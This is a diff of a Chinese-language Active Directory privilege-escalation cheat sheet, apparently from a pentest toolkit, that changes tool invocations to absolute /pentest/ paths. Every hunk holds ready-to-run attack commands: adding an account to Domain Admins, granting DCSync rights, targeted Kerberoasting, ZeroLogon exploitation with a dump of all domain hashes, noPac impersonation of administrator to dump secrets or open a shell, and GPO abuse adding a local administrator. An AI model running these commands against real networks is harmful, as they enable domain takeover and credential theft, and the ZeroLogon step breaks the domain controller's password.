@@ -53,7 +53,7 @@ net rpc group addmem "Domain Admins" ATTACKER -U DOMAIN/ATTACKER%PASS -S DC_IP
 impacket-dacledit -action write -rights DCSync -principal ATTACKER -target-dn "DC=domain,DC=com" DOMAIN/ATTACKER:PASS -dc-ip DC_IP
 
 # GenericWrite on User → 设置 SPN 后 Kerberoasting
-python3 targetedKerberoast.py -u ATTACKER -p PASS -d DOMAIN --dc-ip DC_IP
+python3 /pentest/targetedKerberoast/targetedKerberoast.py -u ATTACKER -p PASS -d DOMAIN --dc-ip DC_IP
 ```
 
 ## 其他提权路径
@@ -74,11 +74,11 @@ impacket-secretsdump DOMAIN/ADMIN:PASS@DC_IP -just-dc
 ### ZeroLogon (CVE-2020-1472)
 将域控机器密码重置为空，直接获取域管权限。影响所有未打补丁的 Windows Server。
 ```bash
-# 检测
-python3 zerologon_tester.py DC_HOSTNAME DC_IP
+# 检测（工具路径: /pentest/CVE-2020-1472/）
+python3 /pentest/CVE-2020-1472/zerologon_tester.py DC_HOSTNAME DC_IP
 
 # 利用（危险！会破坏域控密码，需要恢复）
-python3 cve-2020-1472-exploit.py DC_HOSTNAME DC_IP
+python3 /pentest/CVE-2020-1472/cve-2020-1472-exploit.py DC_HOSTNAME DC_IP
 
 # 利用后 dump 域内所有哈希
 impacket-secretsdump -no-pass -just-dc DOMAIN/DC_HOSTNAME\$@DC_IP
@@ -91,10 +91,10 @@ impacket-restorepassword DOMAIN/DC_HOSTNAME@DC_HOSTNAME -target-ip DC_IP \
 ### noPac (CVE-2021-42278/42287)
 普通域用户直接提升为域管。利用机器账户名称欺骗 + S4U2self。
 ```bash
-# 一键利用
-python3 noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -dump
+# 一键利用（工具路径: /pentest/noPac/）
+python3 /pentest/noPac/noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -dump
 # 或获取 shell
-python3 noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -shell
+python3 /pentest/noPac/noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -shell
 ```
 
 ### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
@@ -123,8 +123,8 @@ SharpGPOAbuse.exe --AddComputerTask --TaskName "pwn" \
   --Arguments "/c net localgroup administrators USER /add" \
   --GPOName "VULNERABLE_GPO"
 
-# pyGPOAbuse（Linux）
-python3 pygpoabuse.py DOMAIN/USER:PASS -gpo-id "GPO_GUID" \
+# pyGPOAbuse（Linux，工具路径: /pentest/pyGPOAbuse/）
+python3 /pentest/pyGPOAbuse/pygpoabuse.py DOMAIN/USER:PASS -gpo-id "GPO_GUID" \
   -command "cmd.exe /c net localgroup administrators USER /add" \
   -dc-ip DC_IP
 ```
